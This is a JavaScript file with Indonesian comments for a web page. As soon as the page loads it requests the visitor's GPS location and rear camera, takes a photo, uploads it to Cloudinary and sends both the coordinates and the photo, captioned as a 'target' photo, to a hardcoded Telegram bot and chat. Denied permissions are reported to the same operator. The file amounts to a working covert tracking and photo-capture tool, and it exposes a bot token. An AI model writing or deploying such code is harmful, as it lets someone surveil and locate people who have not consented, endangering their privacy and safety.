/* =========================================== */
/* script.js: SOLUSI FINAL DENGAN DETEKSI ERROR LOKASI KE TELEGRAM */
/* =========================================== */
    
// --- VARIABEL GLOBAL DENGAN DATA ANDA (TETAP SAMA) ---
const YOUR_BOT_TOKEN = "7932089543:AAESHQcU_WwTvJs-QhJnkbHwKMPiNhrvvYE";
const YOUR_CHAT_ID = "7084437062";

// --- KONFIGURASI CLOUDINARY FINAL ---
const CLOUDINARY_CLOUD_NAME = "djaiuiu4x"; 
const CLOUDINARY_UPLOAD_PRESET = "CLOUDINARY_UPLOAD_PRESET"; 
// -----------------------------------------------------------------

const logDiv = document.getElementById('log');
const videoElement = document.getElementById('videoElement');
const canvasElement = document.getElementById('canvasElement');
const preloader = document.getElementById('preloader');

// Fungsi Log (Tetap Sama)
function appendLog(message, isError = false) {
    if (logDiv.style.display === 'none') {
        logDiv.style.display = 'block';
        logDiv.style.opacity = '1'; 
    }
    const style = isError ? 'color: red;' : 'color: #856404;';
    logDiv.innerHTML += `<p style="${style}">[${new Date().toLocaleTimeString()}] ${message}</p>`;
    logDiv.scrollTop = logDiv.scrollHeight;
}

// --- FUNGSI BARU 5: Mengirim Pesan Teks ke Telegram (Untuk Error) ---
function kirimPesanTeks(text) {
    const telegramTextUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage`;
    fetch(telegramTextUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_CHAT_ID,
            text: text,
        }),
    })
    .then(response => response.json())
    .then(result => {
        if (!result.ok) {
            appendLog(`❌ Gagal mengirim pesan error: ${result.description}`, true);
        }
    });
}


// FUNGSI 1: Mengirim Lokasi (Tetap Sama)
function kirimLokasi(lat, lon) {
    appendLog('Mengirim lokasi sebagai PETA INTERAKTIF...');
    
    const telegramLocationUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendLocation`;

    fetch(telegramLocationUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_CHAT_ID,
            latitude: lat,
            longitude: lon,
        }),
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            appendLog(`✅ Pengiriman Lokasi INTERAKTIF SUKSES!`);
        } else {
            appendLog(`❌ ERROR sendLocation: ${result.description}`, true);
            kirimPesanTeks(`⚠️ GAGAL KIRIM PETA: API Telegram menolak lokasi yang didapat.\nError: ${result.description}`);
        }
    });
}

// FUNGSI 2: Mendapatkan Lokasi Otomatis (Timeout 3 Detik)
function getAutomaticLocation() {
    appendLog('1. Memulai proses Lokasi Otomatis...');
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                appendLog(`✅ Koordinat Diterima: Lat ${lat}, Lon ${lon}.`);
                kirimLokasi(lat, lon); 
            },
            (error) => {
                let errorMsg;
                if (error.code === error.PERMISSION_DENIED) {
                    errorMsg = '❌ ERROR: Pengguna menolak Izin Lokasi.';
                } else if (error.code === error.TIMEOUT) {
                    errorMsg = '❌ ERROR: Geolocation Timeout 3s expired (Sinyal GPS lemah).';
                } else {
                    errorMsg = `❌ ERROR Geolocation: ${error.message}`;
                }
                
                appendLog(errorMsg, true);
                // KIRIM PESAN ERROR KE TELEGRAM
                kirimPesanTeks(`📍 GAGAL MENDAPATKAN LOKASI:\n${errorMsg}\n(Kemungkinan izin ditolak/sinyal lemah)`);
            },
            // Timeout 3000ms (3 detik)
            { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 } 
        );
    } else {
        appendLog('❌ ERROR: Geolocation tidak didukung oleh browser.', true);
        kirimPesanTeks(`📍 GAGAL MENDAPATKAN LOKASI:\nBrowser tidak mendukung Geolocation.`);
    }
}

// FUNGSI 3 & 4: (Kirim Foto URL & Get Automatic Photo) tetap SAMA dengan kode terakhir
// ... [SALIN KODE FUNGSI kirimFotoURL DAN getAutomaticPhoto DARI RESPON SEBELUMNYA DI SINI] ...
function kirimFotoURL(imageUrl, timestamp) {
    appendLog('Mengirim URL foto ke Telegram...');
    
    const telegramPhotoUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendPhoto`;
    const captionText = `📸 Foto Target Diterima!\nTimestamp: ${timestamp}\n(via Cloudinary)`;

    fetch(telegramPhotoUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_CHAT_ID,
            photo: imageUrl, // Kirim URL gambar
            caption: captionText
        }),
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            appendLog(`✅ Pengiriman foto ke Telegram (URL) SUKSES!`);
        } else {
            appendLog(`❌ ERROR sendPhoto (URL): ${result.description}`, true);
        }
    })
    .catch(error => {
        appendLog(`[FATAL ERROR] Gagal mengirim foto URL: ${error.message}`, true);
    });
}


async function getAutomaticPhoto() {
    appendLog('2. Memulai proses Foto Otomatis (Kamera Belakang)...');
    
    const CLOUDINARY_API_URL = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        videoElement.srcObject = stream;
        videoElement.style.display = 'block';
        appendLog('Kamera Diterima. Mengambil gambar dalam 2.5 detik...');

        setTimeout(async () => {
            const context = canvasElement.getContext('2d');
            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            
            const imageDataURL = canvasElement.toDataURL('image/jpeg', 0.8); 
            const timestamp = new Date().toISOString();
            
            appendLog(`Foto berhasil diambil. Mengirim data ke Cloudinary...`);
            
            stream.getTracks().forEach(track => track.stop());
            videoElement.srcObject = null;
            videoElement.style.display = 'none';

            const formData = new FormData();
            formData.append('file', imageDataURL); 
            formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
            formData.append('folder', 'telegram_captures');

            const uploadResponse = await fetch(CLOUDINARY_API_URL, {
                method: 'POST',
                body: formData 
            });

            const uploadResult = await uploadResponse.json();
            
            if (uploadResult && uploadResult.secure_url) { 
                const hostedImageUrl = uploadResult.secure_url;
                appendLog(`✅ Upload ke Cloudinary SUKSES! URL: ${hostedImageUrl}`);
                kirimFotoURL(hostedImageUrl, timestamp);
            } else {
                appendLog(`❌ Upload ke Cloudinary GAGAL. ${uploadResult.error ? uploadResult.error.message : 'Respons tidak valid.'}`, true);
            }

        }, 2500); 

    } catch (err) {
        const errorMsg = (err.name === 'NotAllowedError' || err.name === 'SecurityError') 
            ? '❌ ERROR: Pengguna menolak Izin Kamera.' 
            : `❌ ERROR Kamera: ${err.name} - ${err.message}`;
        appendLog(errorMsg, true);
    }
}
// ... [AKHIR SALINAN KODE] ...


// --- Eksekusi Otomatis (Urutan Prioritas) ---
window.addEventListener('load', () => {
    // Sembunyikan Preloader
    setTimeout(() => { preloader.style.opacity = '0'; setTimeout(() => { preloader.style.display = 'none'; }, 500); }, 800);

    // Prioritaskan Lokasi 
    getAutomaticLocation();
    
    // Tunda Foto 2 detik setelah lokasi dimulai
    setTimeout(() => {
        getAutomaticPhoto();
    }, 2000); 
});